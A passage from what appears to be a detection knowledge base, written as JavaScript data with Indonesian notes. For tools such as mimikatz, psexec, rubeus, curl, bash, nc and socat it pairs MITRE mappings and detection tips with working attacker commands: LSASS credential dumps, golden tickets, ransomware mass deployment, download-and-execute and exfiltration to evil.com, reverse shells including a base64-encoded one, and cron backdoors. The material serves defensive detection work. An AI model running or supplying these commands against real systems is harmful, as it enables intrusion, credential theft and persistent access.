    abuse:"THE credential dump tool. Plaintext passwords, hashes, Kerberos tickets.",
    red:{
      desc:"Credential extraction toolkit — LSASS dump, pass-the-hash, pass-the-ticket, Kerberos attacks, DCSync.",
      cmds:[
        {c:"mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", n:"dump semua credentials dari LSASS — plaintext passwords jika WDigest enabled"},
        {c:"mimikatz.exe \"privilege::debug\" \"sekurlsa::wdigest\" exit", n:"dump WDigest credentials — plaintext passwords (Windows <8.1 atau WDigest enabled)"},
        {c:"mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit", n:"DCSync — pull krbtgt hash dari DC tanpa login ke DC langsung (butuh DA/Replication rights)"},
        {c:"mimikatz.exe \"lsadump::dcsync /domain:corp.local /all /csv\" exit", n:"DCSync semua accounts — dump seluruh AD password hashes"},
        {c:"mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:cmd.exe\" exit", n:"pass-the-hash — spawn cmd sebagai user lain menggunakan NTLM hash tanpa plaintext password"},
        {c:"mimikatz.exe \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /endin:9999 /ptt\" exit", n:"golden ticket — forge TGT dengan krbtgt hash, valid 9999 jam, /ptt inject langsung ke memory"},
      ]
    },
    legit:"NONE production. Only authorized pentest.",
    tips:["Binary bisa renamed! CEK HASH","Cek sekurlsa::logonpasswords? lsadump::dcsync?","Cek parent — bagaimana masuk system?","Cek lsass access (Event ID 10)","Cek SeDebugPrivilege enabled","Cek lateral movement post-extraction","THIS IS ALWAYS AN INCIDENT"],
    detect:"Detect by hash, YARA, cmdline patterns, lsass access.",
    ref:["https://attack.mitre.org/software/S0002/"] },

  { n:"psexec.exe", c:"offensive", os:"win", p:"N/A (Sysinternals)",
    d:"Remote command execution", r:"CRITICAL",
    m:["T1569.002","T1021.002"], mn:["Service Execution","SMB/Admin Shares"], t:["Execution","Lateral Movement"],
    tldr:"De facto lateral movement tool dan ransomware deployment tool. PSEXESVC service creation di target host = psexec was used. Kalau ada multiple target hosts = mass deployment, prioritas tinggi. Cek auth logs di target host juga.",
    chain:{ stage:"Lateral Movement / Impact", flows:["mimikatz.exe → credential dump → psexec.exe → remote SYSTEM shell","psexec.exe → net.exe user /add → backdoor account","psexec.exe \\\\* → ransomware.exe → mass deployment"] },
    abuse:"De facto lateral movement. Remote exec via SMB. Ransomware deployment.",
    red:{
      desc:"Remote exec via SMB admin shares — lateral movement, SYSTEM shell, mass deployment ke banyak hosts.",
      cmds:[
        {c:"psexec.exe \\\\192.168.1.10 -u DOMAIN\\admin -p Pass123 cmd.exe", n:"interactive CMD di remote host — lateral movement"},
        {c:"psexec.exe \\\\192.168.1.10 -u DOMAIN\\admin -p Pass123 -s cmd.exe", n:"-s = run as SYSTEM — privesc di remote host"},
        {c:"psexec.exe \\\\192.168.1.10 -u DOMAIN\\admin -p Pass123 -d -c C:\\Temp\\beacon.exe", n:"-d = don't wait, -c = copy file dulu ke remote — deploy payload"},
        {c:"psexec.exe \\\\* -u DOMAIN\\admin -p Pass123 cmd /c \"C:\\Temp\\ransomware.exe\"", n:"mass deployment ke semua hosts via admin shares — ransomware pattern"},
      ]
    },
    legit:"IT remote management. Sering di-abuse — always investigate.",
    tips:["Cek target host","Cek credentials /u flag","Cek command di remote","Cek PSEXESVC.exe service creation","Cek named pipe \\\\pipe\\psexecsvc","Cek multiple targets (mass)","Korelasi auth logs target"],
    detect:"Alert PSEXESVC service. Monitor pipe psexecsvc. Detect hash/name.",
    ref:["https://attack.mitre.org/techniques/T1569/002/"] },

  { n:"procdump.exe", c:"offensive", os:"win", p:"N/A (Sysinternals)",
    d:"Process crash dump tool", r:"HIGH",
    m:["T1003.001"], mn:["LSASS Memory"], t:["Credential Access"],
    tldr:"Sysinternals tool yang legitimate untuk app debugging, tapi kalau target-nya lsass = credential theft. Sering dipakai sebagai \"legitimate-looking\" alternative mimikatz karena signed Microsoft. -ma + lsass di cmdline = langsung flag.",
    abuse:"Dump lsass memory. Legitimate-looking mimikatz alternative.",
    red:{
      desc:"LSASS dump via Sysinternals tool — lebih 'legitimate' dari mimikatz, sering bypass AV.",
      cmds:[
        {c:"procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp", n:"-ma = full memory dump dari lsass — paling common. File .dmp kemudian diparse offline"},
        {c:"procdump.exe -ma 624 C:\\Temp\\lsass.dmp", n:"sama tapi pakai PID langsung — 624 = contoh PID lsass"},
        {c:"procdump.exe -ma lsass.exe -accepteula C:\\Temp\\lsass.dmp", n:"-accepteula = suppress EULA dialog — stealth exec"},
      ]
    },
    legit:"App debugging. Targeting lsass = ALWAYS suspicious.",
    tips:["Cek target — lsass? CRITICAL!","Cek output file location","Cek dump exfiltration","Cek parent + user context","Cek -ma flag (full dump)"],
    detect:"Alert procdump targeting lsass.",
    ref:["https://attack.mitre.org/techniques/T1003/001/"] },

  { n:"comsvcs.dll", c:"offensive", os:"win", p:"C:\\Windows\\System32\\comsvcs.dll",
    d:"COM+ Services DLL", r:"HIGH",
    m:["T1003.001"], mn:["LSASS Memory"], t:["Credential Access"],
    tldr:"Windows DLL yang punya MiniDump export — dipakai via rundll32 untuk dump LSASS tanpa upload tools eksternal. Berbahaya karena native + signed Microsoft, sering lolos AV. Cek rundll32 + comsvcs.dll + MiniDump di cmdline.",
    abuse:"MiniDump function via rundll32 dump lsass tanpa upload tool.",
    red:{
      desc:"Native LSASS dump tanpa upload tools eksternal — pakai DLL Windows sendiri via rundll32.",
      cmds:[
        {c:"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\lsass.dmp full", n:"dump LSASS — 624 ganti dengan PID lsass aktual. Cek dengan: tasklist /fi \"imagename eq lsass.exe\""},
        {c:"powershell.exe -c \"$lsassPid=(Get-Process lsass).Id; rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsassPid C:\\Temp\\lsass.dmp full\"", n:"PowerShell one-liner auto-get PID lsass + dump"},
      ]
    },
    legit:"COM+ infra. MiniDump = NEVER legitimate.",
    tips:["Cek comsvcs.dll via rundll32","Cek MiniDump function","Cek target PID — lsass?","Cek output file","TREAT AS CREDENTIAL THEFT"],
    detect:"Alert rundll32 + comsvcs.dll + MiniDump.",
    ref:["https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/"] },

  { n:"rubeus.exe", c:"offensive", os:"win", p:"N/A (offensive tool)",
    d:"Kerberos abuse toolkit", r:"CRITICAL",
    m:["T1558.003","T1558.001"], mn:["Kerberoasting","Golden Ticket"], t:["Credential Access"],
    tldr:"Kerberos attack toolkit — ANY execution = incident. Sering di-rename, tapi indikator behavior-nya jelas: massive TGS requests (kerberoasting) atau unusual Kerberos traffic. Cek Event 4769 dengan RC4 encryption type.",
    abuse:"Kerberoasting, AS-REP roasting, ticket manipulation, S4U, constrained delegation.",
    red:{
      desc:"Kerberos attack toolkit — roasting, ticket forgery, delegation abuse.",
      cmds:[
        {c:"rubeus.exe kerberoast /output:hashes.txt", n:"Kerberoasting — request TGS untuk semua SPNs, dump RC4 hashes untuk offline cracking"},
        {c:"rubeus.exe asreproast /format:hashcat /output:asrep.txt", n:"AS-REP roasting — target accounts yang tidak butuh pre-auth, dump untuk hashcat"},
        {c:"rubeus.exe golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt", n:"forge golden ticket + inject ke session saat ini"},
        {c:"rubeus.exe s4u /user:svcAccount /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/DC01 /ptt", n:"constrained delegation abuse — impersonate admin ke DC"},
        {c:"rubeus.exe dump /service:krbtgt /nowrap", n:"dump Kerberos tickets dari memory — harvest existing tickets"},
      ]
    },
    legit:"NONE. Only pentest.",
    tips:["Bisa renamed — CEK HASH + behavior","Cek Kerberos ticket requests (4769)","Cek TGS RC4 encryption = Kerberoasting","Cek parent process","ALWAYS INCIDENT"],
    detect:"Monitor TGS with RC4. Detect hash/YARA.",
    ref:["https://attack.mitre.org/techniques/T1558/003/"] },

  { n:"sharphound.exe", c:"offensive", os:"win", p:"N/A (BloodHound collector)",
    d:"Active Directory enumeration collector", r:"CRITICAL",
    m:["T1087.002"], mn:["Account Discovery: Domain"], t:["Discovery"],
    tldr:"BloodHound collector — kalau ini jalan, attacker lagi mapping seluruh AD attack paths. ANY execution = incident. Bisa di-rename tapi massive LDAP queries itu susah disembunyiin — cek di DC logs.",
    chain:{ stage:"Discovery → Privilege Escalation", flows:["sharphound.exe → BloodHound analysis → attack path identified → rubeus.exe Kerberoast","sharphound.exe → find DA path → mimikatz.exe → domain compromise"] },
    abuse:"BloodHound data collector — massive AD enum.",
    red:{
      desc:"BloodHound AD collector — dump seluruh AD objects, ACLs, trusts untuk attack path analysis.",
      cmds:[
        {c:"sharphound.exe -c All", n:"collect semua — Users, Groups, Computers, Sessions, Trusts, ACLs. Generate noise besar di network"},
        {c:"sharphound.exe --CollectionMethods All --Domain corp.local --ZipFileName loot.zip", n:"explicit domain + zip output — siap untuk upload ke BloodHound UI"},
        {c:"sharphound.exe -c DCOnly", n:"hanya query DC — lebih stealth, kurang noise, dapat AD structure"},
        {c:"sharphound.exe -c Session --Loop --LoopDuration 02:00:00", n:"loop session collection 2 jam — collect siapa login kemana untuk attack paths"},
      ]
    },
    legit:"NONE production. Only authorized assessment.",
    tips:["Bisa renamed — cek behavior","Cek massive LDAP queries","Cek SMB session enum","Cek output .json/.zip","ALWAYS INCIDENT"],
    detect:"Monitor massive LDAP queries. Detect hash/behavior.",
    ref:["https://attack.mitre.org/software/S0521/"] },

  { n:"lazagne.exe", c:"offensive", os:"win", p:"N/A (offensive tool)",
    d:"Credential recovery tool", r:"CRITICAL",
    m:["T1555"], mn:["Credentials from Password Stores"], t:["Credential Access"],
    tldr:"Harvest semua stored credentials dari semua aplikasi sekaligus — browser, email, WiFi, database. ANY execution = incident, credential exposure confirmed. Assume semua stored passwords di endpoint itu compromised.",
    abuse:"Extract stored passwords dari browsers, mail, wifi, databases.",
    red:{
      desc:"Harvest stored credentials dari semua aplikasi — browsers, email, WiFi, database, git, dll.",
      cmds:[
        {c:"lazagne.exe all", n:"dump semua stored credentials dari semua aplikasi yang dikenali"},
        {c:"lazagne.exe browsers", n:"hanya browser passwords — Chrome, Firefox, Edge, dll"},
        {c:"lazagne.exe all -vv -oA -output C:\\Temp", n:"-vv = verbose, -oA = output all formats ke folder C:\\Temp — staged untuk exfil"},
        {c:"lazagne.exe windows", n:"Windows Credential Manager, DPAPI credentials"},
      ]
    },
    legit:"NONE. Only pentest.",
    tips:["Bisa renamed — cek behavior/hash","Cek access browser password stores","Cek Windows Credential Manager","ALWAYS INCIDENT"],
    detect:"Detect hash/behavior. Monitor credential store access.",
    ref:["https://attack.mitre.org/software/S0349/"] },

  // ┌──────────────────────────────────────────────┐
  // │          CROSS-PLATFORM / LINUX               │
  // └──────────────────────────────────────────────┘
  { n:"curl", c:"utility", os:"cross", p:"/usr/bin/curl | C:\\Windows\\System32\\curl.exe",
    d:"Transfer data via various protocols", r:"MEDIUM",
    m:["T1105","T1071.001"], mn:["Ingress Tool Transfer","Web Protocols"], t:["Command and Control"],
    tldr:"Transfer tool yang ada di mana-mana — sendiri common dan gak suspicious. Yang langsung jadi concern: curl piped ke bash/sh (exec dari internet langsung ke memori), atau POST ke external dengan data. Fokus ke destination dan apa yang dilakukan sama data-nya.",
    abuse:"Download/upload payloads, exfil data, C2 comms.",
    red:{
      desc:"Download payloads, POST exfil data ke external, C2 communication, pipe ke shell untuk fileless exec.",
      cmds:[
        {c:"curl http://evil.com/beacon.exe -o C:\\Temp\\beacon.exe && C:\\Temp\\beacon.exe", n:"download + exec payload — Windows"},
        {c:"curl http://evil.com/shell.sh | bash", n:"curl-pipe-bash — fileless exec script langsung dari URL tanpa tulis disk"},
        {c:"curl -s http://evil.com/shell.sh | bash -s", n:"-s = silent (no progress), common di automated payloads"},
        {c:"curl -d @/etc/passwd http://evil.com/exfil?host=$(hostname)", n:"POST exfil /etc/passwd + hostname ke attacker server"},
        {c:"curl -X POST http://evil.com/c2 -H 'Content-Type: application/json' -d '{\"data\":\"BASE64\"}'", n:"C2 communication via HTTP POST — beacon-style"},
      ]
    },
    legit:"Widely used. Fokus DESTINATION + DATA.",
    tips:["Cek URL tujuan","Cek flags -o, -d, -X","Cek POST ke external","Cek parent process","Cek curl | bash = SANGAT suspicious"],
    detect:"Alert curl piped to shell. Monitor POST external.",
    ref:["https://attack.mitre.org/techniques/T1105/"] },

  { n:"wget", c:"utility", os:"cross", p:"/usr/bin/wget",
    d:"Download files from web", r:"MEDIUM",
    m:["T1105"], mn:["Ingress Tool Transfer"], t:["Command and Control"],
    tldr:"Download tool Linux yang common. Pattern suspicious: download ke /tmp atau /dev/shm (RAM disk), pipe ke bash, atau filename hidden dengan dot prefix. Pattern download-chmod-exec sangat common di post-exploit Linux dropper.",
    abuse:"Download malware. User-Agent di logs = automated.",
    red:{
      desc:"Download payloads ke disk atau pipe langsung ke shell — common di Linux post-exploit.",
      cmds:[
        {c:"wget http://evil.com/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh", n:"download + chmod + exec — classic Linux dropper chain"},
        {c:"wget -q -O /dev/shm/.update http://evil.com/elf_beacon && chmod +x /dev/shm/.update && /dev/shm/.update", n:"/dev/shm = RAM-based tmpfs — fileless-ish, tidak ada di disk biasa"},
        {c:"wget -q http://evil.com/shell.sh -O- | bash", n:"pipe ke bash langsung tanpa tulis file"},
        {c:"wget --user-agent=\"Mozilla/5.0\" http://evil.com/payload -O /tmp/.hidden", n:"custom User-Agent untuk bypass detection, hidden file (dot prefix)"},
      ]
    },
    legit:"Legitimate download. Cek context.",
    tips:["Cek URL — sensitive files (.env, wp-config)?","Cek User-Agent Wget/ di logs","Cek response code","Cek multiple requests (scanning)","Cek IP reputation"],
    detect:"Alert Wget UA di WAF ke sensitive endpoints.",
    ref:["https://attack.mitre.org/techniques/T1105/"] },

  { n:"python", c:"interpreter", os:"cross", p:"/usr/bin/python | python.exe",
    d:"Python interpreter", r:"HIGH",
    m:["T1059.006"], mn:["Python"], t:["Execution"],
    tldr:"Di endpoint user non-dev, Python harusnya gak ada. python3 -c = inline code yang perlu di-inspect. Impacket suite jalan di Python untuk AD attacks dari Linux tanpa touch target disk. Cek network connections dan imports yang suspicious (socket, subprocess, ctypes).",
    abuse:"Arbitrary scripts — reverse shells, C2, data exfil.",
    red:{
      desc:"Reverse shells, Impacket suite untuk AD attacks, custom C2 scripts, credential extraction.",
      cmds:[
        {c:"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"", n:"Python reverse shell one-liner — common di RCE exploit post-exploit"},
        {c:"python3 -c \"import pty;pty.spawn('/bin/bash')\"", n:"upgrade ke full TTY shell — sering dilakukan setelah dapat basic shell"},
        {c:"python3 -m http.server 8080", n:"spin up HTTP server untuk serve payloads ke target lain — lateral movement tool staging"},
        {c:"python3 /opt/impacket/examples/secretsdump.py DOMAIN/admin:Pass@192.168.1.10", n:"Impacket secretsdump — remote credential dump (NTLM, Kerberos) tanpa touch target disk"},
        {c:"python3 /opt/impacket/examples/psexec.py DOMAIN/admin:Pass@192.168.1.10", n:"Impacket psexec — lateral movement via SMB"},
      ]
    },
    legit:"Dev/automation. User endpoint = suspicious.",
    tips:["Cek -c (inline)? Decode!","Cek script location+content","Cek Python expected on endpoint?","Cek network connections","Cek child processes","Cek imports (socket,subprocess,os,ctypes)"],
    detect:"Alert python non-dev endpoints. Monitor network.",
    ref:["https://attack.mitre.org/techniques/T1059/006/"] },

  { n:"bash", c:"shell", os:"linux", p:"/bin/bash",
    d:"Bourne Again Shell", r:"HIGH",
    m:["T1059.004"], mn:["Unix Shell"], t:["Execution"],
    tldr:"Reverse shell via /dev/tcp adalah built-in bash sendiri, gak butuh tools tambahan — makanya ini selalu jadi go-to attacker. Parent web server spawn bash = RCE confirmed, langsung escalate. Cek juga base64 yang piped ke bash.",
    chain:{ stage:"Initial Access (RCE) → Execution", flows:["web app RCE → bash -i /dev/tcp → attacker shell","curl payload | bash → dropper → crontab persistence","bash reverse shell → python pty upgrade → ssh key drop → persistence"] },
    abuse:"Entry point most Linux attacks. Reverse shells.",
    red:{
      desc:"Reverse shells, execution via RCE, command chaining post-exploit.",
      cmds:[
        {c:"bash -i >& /dev/tcp/10.10.10.10/4444 0>&1", n:"reverse shell klasik via /dev/tcp — built-in bash, tidak butuh nc/netcat"},
        {c:"bash -c \"bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\"", n:"wrapped dalam -c untuk inject via RCE param"},
        {c:"echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=' | base64 -d | bash", n:"base64-encoded reverse shell — bypass simple string detection"},
        {c:"bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 &", n:"daemonize reverse shell — run di background"},
        {c:"0<&196;exec 196<>/dev/tcp/10.10.10.10/4444; bash <&196 >&196 2>&196", n:"varian file descriptor — bypass beberapa WAF/detection yang block pattern standar"},
      ]
    },
    legit:"Primary shell. Fokus PARENT + COMMAND.",
    tips:["Cek reverse shell (bash -i >& /dev/tcp/...)","Cek parent — web server (RCE)?","Cek network connections","Cek base64 -d | bash","Cek bash_history"],
    detect:"Alert reverse shell patterns, piped base64, web server spawn.",
    ref:["https://attack.mitre.org/techniques/T1059/004/"] },

  { n:"sh", c:"shell", os:"linux", p:"/bin/sh",
    d:"Bourne Shell", r:"HIGH",
    m:["T1059.004"], mn:["Unix Shell"], t:["Execution"],
    tldr:"Default spawn target exploits karena paling portable — semua Linux/Unix punya sh. Concern sama kayak bash, fokus ke parent process-nya. Web server, database, atau service spawn sh = RCE, treat accordingly.",
    abuse:"Sama bash. Default exploit shell.",
    red:{
      desc:"Default shell untuk banyak exploit — RCE via web app sering spawn sh karena paling portable.",
      cmds:[
        {c:"sh -i >& /dev/tcp/10.10.10.10/4444 0>&1", n:"reverse shell via sh — fallback jika bash tidak ada"},
        {c:"/bin/sh -c \"curl http://evil.com/shell.sh | bash\"", n:"download + exec — common RCE payload injection"},
        {c:"sh -c \"$(curl -fsSL http://evil.com/install.sh)\"", n:"curl-subshell pattern — common di supply chain attacks"},
      ]
    },
    legit:"System scripts. Fokus parent+content.",
    tips:["Sama bash","Cek exploit chain (web server parent)"],
    detect:"Same as bash.",
    ref:["https://attack.mitre.org/techniques/T1059/004/"] },

  { n:"ssh", c:"utility", os:"cross", p:"/usr/bin/ssh",
    d:"Secure Shell remote access", r:"HIGH",
    m:["T1021.004","T1572"], mn:["SSH","Protocol Tunneling"], t:["Lateral Movement","Command and Control"],
    tldr:"Remote access yang sangat legitimate — concern-nya di flags dan destination. -L/-R/-D = tunneling untuk pivot atau C2, bukan remote admin biasa. Unauthorized key di authorized_keys = backdoor persistent access. Unusual destination IP = lateral movement.",
    abuse:"Lateral movement, tunneling C2, port forward pivot.",
    red:{
      desc:"Lateral movement via SSH, port forwarding untuk pivot, SOCKS proxy untuk tunnel traffic C2.",
      cmds:[
        {c:"ssh -L 8080:internal.corp.local:80 user@pivot.server", n:"local port forward — akses internal.corp.local:80 via localhost:8080 (pivot melalui jump host)"},
        {c:"ssh -R 4444:localhost:4444 attacker@evil.com", n:"remote port forward / reverse tunnel — expose port lokal ke attacker server (bypass inbound FW)"},
        {c:"ssh -D 1080 user@pivot.server", n:"SOCKS proxy via SSH — tunnel semua traffic melalui pivot host"},
        {c:"ssh -N -f -L 5985:DC01.corp.local:5985 user@pivot.server", n:"-N=no command, -f=background — forward WinRM port untuk remote PS session ke DC"},
        {c:"ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa user@192.168.1.10", n:"SSH dengan stolen private key — non-interactive untuk scripted lateral movement"},
      ]
    },
    legit:"Remote admin. Investigate unusual dest/tunnel/keys.",
    tips:["Cek destination host+port","Cek tunnel flags -L,-R,-D","Cek auth method pw vs key","Cek authorized_keys","Cek /var/log/auth.log","Cek unusual source IPs"],
    detect:"Monitor SSH unusual dest. Alert tunnel flags. Monitor authorized_keys.",
    ref:["https://attack.mitre.org/techniques/T1021/004/"] },

  { n:"nc", c:"tool", os:"linux", p:"/usr/bin/nc",
    d:"Netcat — network Swiss army knife", r:"CRITICAL",
    m:["T1095"], mn:["Non-Application Layer Protocol"], t:["Command and Control"],
    tldr:"Hampir gak ada legitimate production use. ANY usage di production environment = investigate. -e flag + IP = reverse shell setup. Kalau gak ada -e (openbsd nc), attacker pakai mkfifo pattern — sama efektifnya.",
    abuse:"Reverse shells, file transfer, port scan, proxy.",
    red:{
      desc:"Swiss army knife networking untuk shells, file transfer, port scanning, pivoting.",
      cmds:[
        {c:"nc -e /bin/bash 10.10.10.10 4444", n:"reverse shell dengan -e (execute) — tidak semua nc version support, tapi paling simpel"},
        {c:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f", n:"mkfifo reverse shell — works di nc tanpa -e support (busybox/openbsd nc)"},
        {c:"nc -lvnp 4444", n:"listener — bind shell / menunggu koneksi masuk dari reverse shell"},
        {c:"nc -w3 10.10.10.10 4444 < /etc/shadow", n:"file exfil — kirim /etc/shadow ke attacker listener"},
        {c:"nc -z -v 192.168.1.1-254 22 80 443 2>&1 | grep open", n:"port scan sederhana — identifikasi open ports di subnet"},
      ]
    },
    legit:"Network debug. Production = ALMOST ALWAYS suspicious.",
    tips:["Cek -e (execute), -l (listen), -p (port)","Cek pipe /bin/bash (reverse shell)","Cek destination IP+port","Cek parent — web server?","Cek listen mode (backdoor?)"],
    detect:"Alert ANY nc production. Monitor -e flag.",
    ref:["https://attack.mitre.org/techniques/T1095/"] },

  { n:"ncat", c:"tool", os:"linux", p:"/usr/bin/ncat",
    d:"Nmap netcat replacement", r:"CRITICAL",
    m:["T1095"], mn:["Non-Application Layer Protocol"], t:["Command and Control"],
    tldr:"Modern netcat dengan SSL — sama berbahayanya dengan nc tapi traffic dienkripsi. --ssl flag = reverse shell yang harder to inspect lewat SSL inspection. Treat sama persis seperti nc.",
    abuse:"Modern nc. SSL support, proxy chains.",
    red:{
      desc:"Modern netcat dengan SSL — encrypted reverse shells yang lebih sulit di-intercept oleh SSL inspection.",
      cmds:[
        {c:"ncat --ssl -e /bin/bash 10.10.10.10 4444", n:"SSL-encrypted reverse shell — traffic terenkripsi, bypass SSL inspection jika no cert pinning"},
        {c:"ncat --ssl -lvnp 4444", n:"SSL listener di attacker side — pair dengan command di atas"},
        {c:"ncat --proxy 10.10.10.10:1080 --proxy-type socks5 -e /bin/bash evil.com 443", n:"reverse shell via SOCKS proxy — pivot/chain connections"},
      ]
    },
    legit:"Same as nc.",
    tips:["Sama nc","Cek --ssl (encrypted)","Cek --proxy"],
    detect:"Same as nc.",
    ref:["https://attack.mitre.org/techniques/T1095/"] },

  { n:"nmap", c:"tool", os:"cross", p:"/usr/bin/nmap",
    d:"Network scanner", r:"HIGH",
    m:["T1046"], mn:["Network Service Discovery"], t:["Discovery"],
    tldr:"Network scanner yang HARUS punya approval untuk dijalanin di production. Tanpa approval = unauthorized recon. Di tangan attacker setelah initial access = pre-lateral movement network mapping. Cek target range dan --script flag.",
    abuse:"Port scan, service enum, OS fingerprint, vuln scan.",
    red:{
      desc:"Network reconnaissance — port scan, service fingerprint, OS detect, vulnerability scan via NSE scripts.",
      cmds:[
        {c:"nmap -sS -sV -O 192.168.1.0/24 -oA /tmp/scan", n:"SYN scan + service version + OS detect di seluruh subnet — dump ke file"},
        {c:"nmap -p 22,80,443,3389,5985,5986,8080 -T4 192.168.1.0/24", n:"targeted port scan — focus pada ports yang berguna untuk lateral movement"},
        {c:"nmap --script vuln 192.168.1.10", n:"vulnerability scan via NSE scripts — identify exploitable services"},
        {c:"nmap -sU -p 53,161,500 192.168.1.0/24", n:"UDP scan — DNS, SNMP, IKE — protokol yang sering overlooked"},
        {c:"nmap -sn 192.168.1.0/24", n:"ping sweep saja — host discovery tanpa port scan, lebih cepat + less noise"},
      ]
    },
    legit:"Pentest/admin. HARUS approval.",
    tips:["Cek scan -sS,-sV,-O","Cek target range","Cek --script (vuln scan)","Cek user authorized?","Cek timing -T4/-T5","Korelasi scan approval"],
    detect:"Alert nmap production. Whitelist authorized.",
    ref:["https://attack.mitre.org/techniques/T1046/"] },

  { n:"crontab", c:"system", os:"linux", p:"/usr/bin/crontab",
    d:"Schedule periodic tasks", r:"HIGH",
    m:["T1053.003"], mn:["Cron"], t:["Execution","Persistence"],
    tldr:"Cron = persistence di Linux. Cek crontab -l untuk semua users plus /etc/cron.d/. Entry yang jalanin script dari /tmp, /dev/shm, atau pull dari internet = persistence backdoor. Frekuensi */1 (setiap menit) itu suspicious.",
    abuse:"Cron persistence — periodic reverse shell/script.",
    red:{
      desc:"Persistence via cron — periodic reverse shell, scheduled payload exec, scheduled exfil.",
      cmds:[
        {c:"echo \"* * * * * bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\" | crontab -", n:"setiap menit buka reverse shell — persistent C2 callback"},
        {c:"echo \"*/5 * * * * curl -s http://evil.com/check.sh | bash\" > /etc/cron.d/updates", n:"setiap 5 menit pull + exec script dari C2 — cron sebagai C2 polling"},
        {c:"(crontab -l 2>/dev/null; echo \"@reboot /tmp/.update\") | crontab -", n:"@reboot — exec saat boot, append ke existing crontab tanpa hapus yang lama"},
        {c:"echo \"0 3 * * * /bin/bash /var/www/html/.cache/.backdoor.sh\" >> /etc/crontab", n:"hidden file + malam hari — stealth persistence, beware naming"},
      ]
    },
    legit:"Maintenance/backups. Cek CONTENT.",
    tips:["Cek crontab -l (user+root)","Cek /etc/crontab + /etc/cron.d/","Cek /var/spool/cron/","Cek script content+perms","Cek new suspicious entries","Cek */1 freq (suspicious)"],
    detect:"Monitor crontab mods. Alert /tmp or internet scripts.",
    ref:["https://attack.mitre.org/techniques/T1053/003/"] },

  { n:"socat", c:"tool", os:"linux", p:"/usr/bin/socat",
    d:"Multipurpose relay (advanced netcat)", r:"CRITICAL",
    m:["T1095"], mn:["Non-Application Layer Protocol"], t:["Command and Control"],
    tldr:"Advanced netcat dengan full TTY + SSL — \"luxury\" reverse shell yang kasih attacker interactive shell penuh, bisa run vim, su, dll. ANY production usage suspicious. EXEC param = exec shell, OPENSSL = encrypted, TCP-LISTEN = bind shell/backdoor.",
    abuse:"Advanced nc — encrypted reverse shells, port forward, proxy.",
    red:{
      desc:"Advanced netcat dengan full TTY support dan SSL — encrypted interactive shell yang sulit dianalisis.",
      cmds:[
        {c:"socat TCP4:10.10.10.10:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", n:"full TTY reverse shell — interactive shell penuh (bisa run vim, su, dll)"},
        {c:"socat OPENSSL:10.10.10.10:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid", n:"SSL-encrypted full TTY reverse shell — traffic dienkripsi"},
        {c:"socat TCP4-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr", n:"bind shell listener — tunggu koneksi masuk"},
        {c:"socat TCP4-LISTEN:8080,reuseaddr,fork TCP4:192.168.1.10:80", n:"port relay/pivot — forward traffic dari port 8080 ke internal host:80"},
      ]
    },
    legit:"Network debug. Production = very suspicious.",
    tips:["Cek EXEC param (shell exec)","Cek TCP-LISTEN (backdoor?)","Cek OPENSSL (encrypted)","Cek parent+destination"],
    detect:"Alert socat production. Monitor EXEC + TCP-LISTEN.",
    ref:["https://attack.mitre.org/techniques/T1095/"] },

  { n:"tcpdump", c:"tool", os:"linux", p:"/usr/sbin/tcpdump",
    d:"Network packet capture", r:"MEDIUM",
    m:["T1040"], mn:["Network Sniffing"], t:["Credential Access","Discovery"],
    tldr:"Packet capture yang legitimate untuk troubleshoot. Concern kalau: duration lama, output ke file (-w), filter ke auth traffic (port 21, 23, 389). File .pcap yang dibuat = potential credential exfil. Cek siapa yang run dan berapa lama.",
    abuse:"Sniff credentials, monitor traffic.",
    red:{
      desc:"Credential sniffing dari plaintext protocols dan traffic analysis untuk recon.",
      cmds:[
        {c:"tcpdump -i eth0 -w /tmp/.capture.pcap 'port 21 or port 23 or port 80 or port 110'", n:"capture FTP/Telnet/HTTP/POP3 — target plaintext credential protocols"},
        {c:"tcpdump -i any -A 'tcp port 21 or tcp port 23' | grep -i -E 'pass|user|login'", n:"live grep untuk credentials dari FTP/Telnet traffic"},
        {c:"tcpdump -i eth0 -w /tmp/.cap.pcap host 192.168.1.10", n:"capture semua traffic ke/dari specific host — recon + credential harvest"},
        {c:"tcpdump -i any port 389 -w /tmp/ldap.pcap", n:"capture LDAP traffic — intercept AD queries, possible credential sniff"},
      ]
    },
    legit:"Network troubleshoot. Check who+duration+filter.",
    tips:["Cek capture filters — auth traffic?","Cek output -w (exfil risk)","Cek duration — long = suspicious","Cek user authorized?"],
    detect:"Monitor tcpdump. Alert long captures + output files.",
    ref:["https://attack.mitre.org/techniques/T1040/"] },

  { n:"dd", c:"system", os:"linux", p:"/usr/bin/dd",
    d:"Convert and copy files", r:"MEDIUM",
    m:["T1485","T1006"], mn:["Data Destruction","Direct Volume Access"], t:["Impact","Defense Evasion"],
    tldr:"Raw disk copy — legitimate untuk forensics/backup. Yang langsung alarm: target adalah disk device (/dev/sda, /dev/nvme0). if=/dev/zero ke disk = wipe destructive, irreversible. Piped ke nc/curl = raw disk exfil.",
    abuse:"Disk wipe (dd if=/dev/zero), direct disk read/write.",
    red:{
